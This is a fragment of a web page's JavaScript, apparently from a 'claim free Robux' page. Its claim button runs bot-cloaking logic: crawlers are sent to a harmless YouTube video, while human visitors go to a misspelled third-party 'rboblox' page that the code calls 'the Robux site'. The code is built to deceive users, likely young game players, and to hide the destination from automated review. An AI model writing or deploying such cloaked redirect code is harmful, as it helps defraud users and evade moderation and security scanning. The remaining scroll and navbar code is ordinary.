    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
    <script>
        // Simple bot detection and redirect logic
        const userAgent = navigator.userAgent.toLowerCase();
        const isBot = /bot|crawler|spider|crawling/i.test(userAgent);
        
        document.getElementById('claimBtn').addEventListener('click', function(e) {
            e.preventDefault();
            
            if (isBot) {
                // Redirect bots to YouTube
                window.open('https://www.youtube.com/watch?v=fTrqoVSrw1Y&ab_channel=YukingLyrics', '_blank');
            } else {
                // Redirect normal users to the Robux site
                window.open('https://en.fabluks.com/rboblox', '_blank');
            }
        });

        // Smooth scrolling for anchor links
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                if (this.getAttribute('href') !== '#') {
                    e.preventDefault();
                    const target = document.querySelector(this.getAttribute('href'));
                    if (target) {
                        target.scrollIntoView({
                            behavior: 'smooth',
                            block: 'start'
                        });
                    }
                }
            });
        });

        // Add scroll effect to navbar
        window.addEventListener('scroll', function() {
            const navbar = document.querySelector('.navbar');
            if (window.scrollY > 50) {
                navbar.style.background = 'rgba(0, 0, 0, 0.95)';
            } else {
                navbar.style.background = 'rgba(0, 0, 0, 0.9)';
            }
        });
    </script>
